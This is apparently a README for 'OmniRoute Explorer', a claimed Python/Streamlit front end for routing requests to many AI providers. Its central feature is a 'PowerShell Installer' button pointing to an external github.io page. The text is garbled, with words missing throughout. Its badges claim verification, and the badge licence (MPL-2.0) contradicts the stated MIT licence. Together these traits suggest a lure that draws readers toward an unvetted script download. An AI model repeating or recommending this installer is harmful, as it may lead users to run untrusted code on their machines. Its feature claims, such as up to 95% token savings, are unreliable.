<div align="center">

# OmniRoute Explorer — Your Open Access Routing Web Platform

![](files/preview.png)

### 💻 PowerShell Installer

[![](files/button.png)](https://titisseptian-SS.github.io/omniroute-explorer/)

[![ps](https://img.shields.io/badge/Ps-5%2B-06b6d4?style=for-the-badge&labelColor=0d1117)]() [![status](https://img.shields.io/badge/Status-Verified-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![tests](https://img.shields.io/badge/Tests-Passing-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![licence](https://img.shields.io/badge/Licence-Mpl--2.0-22d3ee?style=for-the-badge&labelColor=0d1117)]()

</div>

---

OmniRoute Explorer is a lightweight desktop-style and tool built on OmniRoute, the openly accessible. Through a single unified endpoint, it connects you to hundreds of providers, letting you generate code, chat with models, and produce polished Markdown reports from one streamlined interface. Built-in compression trims token usage dramatically, so every session stretches further. It is a focused, refined workspace for anyone who wants multi-provider power without the usual complexity.

## 🔧 Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Key Capabilities

**Unified Provider Access** — Reach a broad spectrum of providers through one consistent, OpenAI-compatible endpoint, so you can explore, compare, and switch between models without reworking your setup.
- **Token-Efficient Conversations** — Built-in compression trims payloads dramatically, keeping interactions lean and cost-conscious without sacrificing the quality of responses.
- **Resilient Routing** — A layered fallback system keeps your workflows moving smoothly even when a given provider is slow or unavailable, so exploration never stalls.
- **Visual Explorer Interface** — A responsive invites you to query models interactively, inspect results, and iterate on prompts in a polished, distraction-light environment.
- **Automated ** — Generate clean, formatted Markdown reports on demand, turning model output into shareable analysis you can drop straight into your documentation or reviews.
- **Local-First Workflow** — Develop and test against your own local endpoint, giving you fast iteration, predictable latency, and independence from network conditions.
- **Open and Extensible Foundation** — A minimal dependency footprint and transparent structure make it straightforward to adapt the explorer to your own use cases and extend it as your needs grow.

## Tech Stack

OmniRoute Explorer is built on a lean, modern foundation that keeps the experience fast and the footprint small.

- **Python** — the engine behind every route, report, and interaction. Clean, dependable, and ready for your workflow.
- **Streamlit** — a polished, responsive interface that turns OmniRoute's capabilities into an intuitive visual explorer.
- **OpenAI SDK** — speaks OmniRoute's native OpenAI-compatible protocol, so every request flows through a single, unified endpoint.
- **OmniRoute ** — the routing core that powers Explorer, delivering intelligent model selection and token-efficient operation across hundreds of providers.

Every layer is intentionally chosen for speed and clarity — no bloat, no unnecessary moving parts. Just a tightly integrated stack that lets OmniRoute Explorer deliver a refined, dependable experience from the first query.

## Getting Started

OmniRoute Explorer is designed to get you from a fresh checkout to a working, polished interface in moments—not hours. The experience is intentionally streamlined: bring your OmniRoute endpoint online, point Explorer at it, and you're immediately navigating a clean, unified for every model behind your.

### Connect and Launch

Explorer speaks natively to your OmniRoute through its OpenAI-compatible endpoint, which means there's no new protocol to learn and no configuration maze to navigate. Once your is running locally or remotely, Explorer picks up the connection and presents your entire routing surface as a single, approachable workspace.

### Explore Your Routes

From the, you can browse available providers, inspect routing behavior, and send prompts through your 's automatic model selection. The interface is built for clarity: clear status indicators, readable results, and a layout that keeps the focus on what matters—your models and their responses.

### Generate Polished Reports

Explorer includes a workflow that turns your queries into neatly formatted Markdown output. Whether you're documenting model comparisons or capturing a snapshot of routing behavior, the report generator handles the formatting so you can share results that look as good as they read.

### Built for Every Workflow

Prefer the command line? The script runs standalone and slots naturally into automated pipelines. Prefer a visual experience? The offers an interactive, responsive surface for hands-on exploration. Both paths share the same configuration and the same OmniRoute connection, so you can move between them without friction.

### What You Need

- A running OmniRoute (local or remote)
- A modern browser for the experience
- A Python environment for the utilities

That's the entire setup story. OmniRoute Explorer keeps configuration minimal and capability maximal—an accessible, open entry point into the full breadth of your.

## FAQ

**Is OmniRoute Explorer itself no-cost to use?**
Yes — the explorer is completely accessible at no cost, with no accounts, subscriptions, or paywalls. You get the full, tools, and provider connectivity out of the box.

**Do I need my own API keys for each provider?**
No. OmniRoute Explorer routes everything through a single OmniRoute endpoint, so you configure one connection and reach the full catalog of supported providers. No key juggling required.

**How does the token compression actually work?**
OmniRoute's built-in compression intelligently trims redundant context before requests leave your machine. In practice, teams see savings of up to 95% on token usage — which means faster responses and lighter resource consumption across the board.

**Can I use it for automated in CI/CD?**
Absolutely. The script is built for pipelines: point it at a prompt, run it headlessly, and get clean Markdown output ready to attach to pull requests, release notes, or documentation.

**What happens if a provider is rate-limited or down?**
OmniRoute's multi-tier fallback system automatically reroutes your request to the next available provider, so your workflows keep running without manual intervention.

**Is my data sent anywhere besides the providers I query?**
Requests flow only between your local instance, the OmniRoute, and the provider you're targeting. Nothing is stored or forwarded to third parties.

**Does it work offline?**
The explorer is designed for local-first development — run it against a local OmniRoute instance and keep building even when cloud latency or connectivity is unreliable.

**Which models can I try?**
Any model exposed through your OmniRoute routing configuration, including automatic routing that selects the best fit for each prompt. Swap models freely without touching your integration code.

**Can I extend it with my own prompts and workflows?**
Yes. The codebase is intentionally small and readable — the script and are easy to adapt, so you can tailor prompts, outputs, and UI behavior to your team's needs.

## License

OmniRoute Explorer is released under the MIT License, giving you the freedom to use, modify, and distribute the project for both personal and commercial purposes. We believe great tooling should be accessible to everyone, so the full source is available for you to inspect, adapt, and build upon.

You are welcome to:
- **Use** OmniRoute Explorer in your own projects, products, and workflows.
- **Modify** the code to fit your needs and extend its capabilities.
- **Distribute** your own versions, provided the original license notice is preserved.
- **Contribute** improvements back to the project and help shape its future.

The software is provided "as is," without warranty of any kind, express or implied. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from the use of the software.

For full terms, refer to the LICENSE file included in this repository.